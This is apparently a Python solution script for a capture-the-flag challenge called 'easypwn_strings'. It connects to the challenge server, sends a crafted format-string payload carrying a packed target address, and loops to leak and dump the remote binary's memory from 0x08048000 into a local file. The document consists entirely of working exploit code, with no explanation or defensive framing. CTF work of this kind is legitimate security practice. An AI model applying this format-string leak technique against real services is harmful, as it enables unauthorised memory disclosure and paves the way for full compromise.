import struct
import socket
import telnetlib

def tcp_connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	return s

def recv_until(s, string):
	received = ""

	while string not in received:
		received += s.recv(1)

	return received

def telnet_interact(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def dump(adr, frmt="p"):

	raw_adr = struct.pack("I", adr)

	if "\x0a" in raw_adr or "\x00" in raw_adr:
		return "X"

	s = tcp_connect("pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1234)

	s.send("3\n")

	leak = "|%28${}|".format(frmt)
	format_string = leak.ljust(61, "X") + "EOF_easypwn_strings" + struct.pack("I", adr)

	s.send(format_string + "\n")

	s.send("0\n")

	response = recv_until(s, "EOF_easypwn_strings")

	leaked_data = response.split("|")[1].split("|XXXXXXXXXX")[0]

	if len(leaked_data) == 0:
		return "\x00"

	return leaked_data

binary_adr = 0x08048000

while True:
	with open("easypwn_strings.raw", "ab") as output_f:
		response = dump(binary_adr, "s")
		output_f.write(response)
		binary_adr += len(response)